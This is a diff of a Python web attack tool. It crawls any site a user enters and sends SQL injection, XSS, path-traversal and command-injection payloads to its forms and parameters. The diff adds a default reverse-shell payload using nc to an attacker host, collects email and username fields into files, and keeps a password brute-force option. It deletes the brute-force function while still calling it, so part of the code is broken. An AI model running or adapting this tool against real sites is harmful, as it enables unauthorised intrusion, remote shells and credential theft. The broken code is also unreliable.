@@ -4,6 +4,8 @@ import re
 import urllib.parse
 import time
 from selenium import webdriver
+import os
+
 def display_name():
     #name
     name_art = """
@@ -19,36 +21,42 @@ def display_name():
     """
     tool_name = "\033[36mTool Name: web\033[0m"
     
-  
     print(name_art)
     print(tool_name)
 
 display_name()
 
+def format_url(url):
+    if not (url.startswith("http://") or url.startswith("https://")):
+        url = "https://" + url
+    if not (url.startswith("www.") or "://" in url):
+        url = "www." + url
+    return url
 
-# সমস্ত লিঙ্ক খুঁজে বের করার ফাংশন
+def save_to_file(filename, data):
+    with open(filename, 'w') as file:
+        for item in data:
+            file.write(f"{item}\n")
+
 def find_links(url):
     try:
         response = requests.get(url)
         soup = BeautifulSoup(response.text, "html.parser")
         links = set()
 
-        # সমস্ত <a> ট্যাগ থেকে লিঙ্ক সংগ্রহ করা
         for a_tag in soup.find_all('a', href=True):
             link = urllib.parse.urljoin(url, a_tag['href'])
-            if url in link:  # শুধুমাত্র মূল ডোমেইনের লিঙ্ক খুঁজবে
+            if url in link:
                 links.add(link)
         return links
     except Exception as e:
         print(f"Error fetching links from {url}: {e}")
         return set()
 
-# SQL ইনজেকশন টেস্ট
-def sql_injection_test(url, params):
-    sql_payloads = ["' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*", "' OR '1'='1' #"]
+def sql_injection_test(url, params, payloads):
     vulnerable = False
     
-    for payload in sql_payloads:
+    for payload in payloads:
         for param in params:
             test_params = params.copy()
             test_params[param] = payload
@@ -62,12 +70,10 @@ def sql_injection_test(url, params):
     if not vulnerable:
         print("No SQL Injection vulnerabilities found.")
 
-# XSS টেস্ট ফাংশন
-def xss_test(url, params):
-    xss_payloads = ["<script>alert('XSS')</script>", "'\"><img src=x onerror=alert(1)>", "<body onload=alert(1)>"]
+def xss_test(url, params, payloads):
     vulnerable = False
 
-    for payload in xss_payloads:
+    for payload in payloads:
         for param in params:
             test_params = params.copy()
             test_params[param] = payload
@@ -81,7 +87,6 @@ def xss_test(url, params):
     if not vulnerable:
         print("No XSS vulnerabilities found.")
 
-# হেডার এনালাইসিস
 def analyze_headers(url):
     response = requests.get(url)
     headers = response.headers
@@ -92,11 +97,13 @@ def analyze_headers(url):
     if 'Strict-Transport-Security' not in headers:
         print(f"Strict-Transport-Security header missing on {url}")
 
-# ফর্ম ম্যানিপুলেশন চেক
-def form_analysis(url):
+def form_analysis(url, sql_payloads, xss_payloads):
     try:
         response = requests.get(url)
         soup = BeautifulSoup(response.text, "html.parser")
+        urls = set()
+        usernames = set()
+        vulnerabilities = set()
 
         for form in soup.find_all('form'):
             action = form.get('action')
@@ -113,37 +120,59 @@ def form_analysis(url):
                 if name:
                     form_data[name] = value
 
-            # ফর্ম ইনজেকশন টেস্ট
-            sql_injection_test(form_url, form_data)
-            xss_test(form_url, form_data)
+            sql_injection_test(form_url, form_data, sql_payloads)
+            xss_test(form_url, form_data, xss_payloads)
+
+            urls.add(form_url)
+            for field in form_data.keys():
+                if "email" in field.lower():
+                    usernames.add(form_data[field])
+                if "username" in field.lower():
+                    usernames.add(form_data[field])
+
+        return urls, usernames, vulnerabilities
 
     except Exception as e:
         print(f"Error analyzing forms on {url}: {e}")
+        return set(), set(), set()
 
-# Custom Brute Force Attack with Wordlist
-def brute_force_login(url, username_param, password_param, wordlist):
-    with open(wordlist, 'r') as file:
-        passwords = file.readlines()
+def parameter_fuzzing(url, params, payloads):
+    vulnerable = False
 
-    for password in passwords:
-        password = password.strip()
-        data = {
-            username_param: 'admin',  # আপনি যদি অন্য ইউজারনেম ব্যবহার করতে চান
-            password_param: password
-        }
+    for payload in payloads:
+        for param in params:
+            test_params = params.copy()
+            test_params[param] = payload
 
-        response = requests.post(url, data=data)
-        if "Login Successful" in response.text:  # লগইন সফল হলে এখানে একটি কন্ডিশন সেট করতে হবে
-            print(f"Login successful with password: {password}")
-            break
-        else:
-            print(f"Attempted with password: {password}")
+            response = requests.get(url, params=test_params)
+            if payload in response.text:
+                print(f"Parameter fuzzing found possible vulnerability with payload: {payload} on param: {param}")
+                vulnerable = True
 
-# AJAX এবং JavaScript Loaded লিঙ্ক ক্রল করা (Selenium ব্যবহার করে)
+    if not vulnerable:
+        print("No vulnerabilities found with parameter fuzzing.")
+
+def rce_test(url, params, payloads):
+    vulnerable = False
+
+    for payload in payloads:
+        for param in params:
+            test_params = params.copy()
+            test_params[param] = payload
+
+            response = requests.get(url, params=test_params)
+            if "RCE" in response.text:
+                print(f"Possible RCE vulnerability found with payload: {payload} on param: {param}")
+                vulnerable = True
+                break
+
+    if not vulnerable:
+        print("No RCE vulnerabilities found.")
+
 def deep_crawl_with_selenium(url):
-    driver = webdriver.Firefox()  # আপনি ChromeDriver ও ব্যবহার করতে পারেন
+    driver = webdriver.Firefox()
     driver.get(url)
-    time.sleep(3)  # JavaScript লোড হওয়ার জন্য সময় দিন
+    time.sleep(3)
 
     page_source = driver.page_source
     soup = BeautifulSoup(page_source, 'html.parser')
@@ -157,51 +186,79 @@ def deep_crawl_with_selenium(url):
     driver.quit()
     return links
 
-# প্যারামিটার ফাজিং ফাংশন (Random Parameters ব্যবহার করে)
-def parameter_fuzzing(url, params):
-    fuzz_payloads = ["../../../../etc/passwd", "' OR '1'='1", "<script>alert(1)</script>"]
-    vulnerable = False
+def scan_website(url, sql_payloads, xss_payloads, rce_payloads, fuzz_payloads, wordlist=None):
+    formatted_url = format_url(url)
+    base_domain = urllib.parse.urlparse(formatted_url).netloc.split('.')[0]
+    
+    all_urls = set()
+    all_usernames = set()
+    all_vulnerabilities = set()
 
-    for payload in fuzz_payloads:
-        for param in params:
-            test_params = params.copy()
-            test_params[param] = payload
-
-            response = requests.get(url, params=test_params)
-            if payload in response.text:
-                print(f"Parameter fuzzing found possible vulnerability with payload: {payload} on param: {param}")
-                vulnerable = True
-
-    if not vulnerable:
-        print("No vulnerabilities found with parameter fuzzing.")
-
-# মেইন স্ক্যানিং ফাংশন
-def scan_website(url, wordlist=None):
-    # লিঙ্ক খোঁজা
-    links = find_links(url)
-
-    # যদি JavaScript Loaded লিঙ্ক ক্রল করতে চান
-    deep_links = deep_crawl_with_selenium(url)
+    links = find_links(formatted_url)
+    deep_links = deep_crawl_with_selenium(formatted_url)
     links.update(deep_links)
 
-    # সমস্ত লিঙ্ক স্ক্যান করা
     for link in links:
         print(f"Scanning {link} ...")
-        analyze_headers(link)  # হেডার এনালাইসিস
-        form_analysis(link)    # ফর্ম চেক করা
-        time.sleep(1)          # প্রতিটি স্ক্যানের মাঝে কিছুটা সময় বিরতি
+        analyze_headers(link)
+        urls, usernames, vulnerabilities = form_analysis(link, sql_payloads, xss_payloads)
+        all_urls.update(urls)
+        all_usernames.update(usernames)
+        all_vulnerabilities.update(vulnerabilities)
+        parameter_fuzzing(link, {}, fuzz_payloads)
+        rce_test(link, {}, rce_payloads)
+        time.sleep(1)
 
-    # যদি Custom Brute Force Attack করতে চান
+    save_to_file(f'{base_domain}_all_urls.txt', all_urls)
+    save_to_file(f'{base_domain}_all_usernames_mail.txt', all_usernames)
+    save_to_file(f'{base_domain}_vulnerabilities.txt', all_vulnerabilities)
+
     if wordlist:
         print("Starting brute force attack...")
-        brute_force_login(url, 'username', 'password', wordlist)
+        brute_force_login(formatted_url, 'username', 'password', wordlist)
 
-# মেইন ফাংশন
+def get_default_payloads():
+    sql_payloads = ["' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*", "' OR '1'='1' #"]
+    xss_payloads = ["<script>alert('XSS')</script>", "'\"><img src=x onerror=alert(1)>", "<body onload=alert(1)>"]
+    rce_payloads = ["'; echo RCE", "| nc -e /bin/sh attacker_ip attacker_port"]
+    fuzz_payloads = ["../../../../etc/passwd", "' OR '1'='1", "<script>alert(1)</script>"]
+    
+    return sql_payloads, xss_payloads, rce_payloads, fuzz_payloads
+
 if __name__ == "__main__":
     website_url = input("Enter the website URL (e.g., https://google.com): ")
     wordlist_path = input("Enter the path to the wordlist for brute force (leave blank to skip): ")
-    
-    if wordlist_path:
-        scan_website(website_url, wordlist_path)
+
+    sql_payloads_file = input("Enter path to SQL Injection payloads file (leave blank to use default): ")
+    xss_payloads_file = input("Enter path to XSS payloads file (leave blank to use default): ")
+    rce_payloads_file = input("Enter path to RCE payloads file (leave blank to use default): ")
+    fuzz_payloads_file = input("Enter path to Fuzzing payloads file (leave blank to use default): ")
+
+    if sql_payloads_file:
+        with open(sql_payloads_file, 'r') as file:
+            sql_payloads = [line.strip() for line in file]
     else:
-        scan_website(website_url)
+        sql_payloads, xss_payloads, rce_payloads, fuzz_payloads = get_default_payloads()
+
+    if xss_payloads_file:
+        with open(xss_payloads_file, 'r') as file:
+            xss_payloads = [line.strip() for line in file]
+    else:
+        if not 'xss_payloads' in locals():
+            xss_payloads = get_default_payloads()[1]
+
+    if rce_payloads_file:
+        with open(rce_payloads_file, 'r') as file:
+            rce_payloads = [line.strip() for line in file]
+    else:
+        if not 'rce_payloads' in locals():
+            rce_payloads = get_default_payloads()[2]
+
+    if fuzz_payloads_file:
+        with open(fuzz_payloads_file, 'r') as file:
+            fuzz_payloads = [line.strip() for line in file]
+    else:
+        if not 'fuzz_payloads' in locals():
+            fuzz_payloads = get_default_payloads()[3]
+
+    scan_website(website_url, sql_payloads, xss_payloads, rce_payloads, fuzz_payloads, wordlist_path)
